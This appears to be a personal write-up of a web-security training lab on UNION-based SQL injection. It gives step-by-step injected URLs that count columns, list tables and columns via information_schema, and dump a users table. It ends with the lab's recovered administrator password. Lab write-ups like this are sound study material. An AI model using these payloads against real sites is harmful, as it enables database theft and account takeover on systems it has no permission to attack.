##SQL injection attack, listing the database contents on non-Oracle databases

1. main url : product ==> category
https://0a8400d704c793c1808949ee00d900a2.web-security-academy.net/filter?category=Gifts

2. find the number of columns in the original query by using the UNION operator with a different number of columns in each SELECT statement, for example:

https://0a8400d704c793c1808949ee00d900a2.web-security-academy.net/filter?category=Gifts' union select null,null--+
3. find the data type of each column by using the UNION operator with different data types in each SELECT statement, for example:
https://0a8400d704c793c1808949ee00d900a2.web-security-academy.net/filter?category=Gifts' union select 'fgsrt','sbcdef'--+
4. find table names in the database by using the following query:
https://0a8400d704c793c1808949ee00d900a2.web-security-academy.net/filter?category=Gifts' union select null, table_name FROM information_schema.tables --

5. find column names in the database by using the following query:
https://0a8400d704c793c1808949ee00d900a2.web-security-academy.net/filter?category=Gifts' union select null, column_name FROM information_schema.columns where table_name = 'users_salkfl' --

6. find the data in the database by using the following query:
https://0a8400d704c793c1808949ee00d900a2.web-security-academy.net/filter?category=Gifts' union select username_mkjfoz, password_vfaytt FROM users_salkfl --


username = administrator
password = ie1rh2mx7fc3xrbnxz8i

s9786dzhnpg58i8mnc6r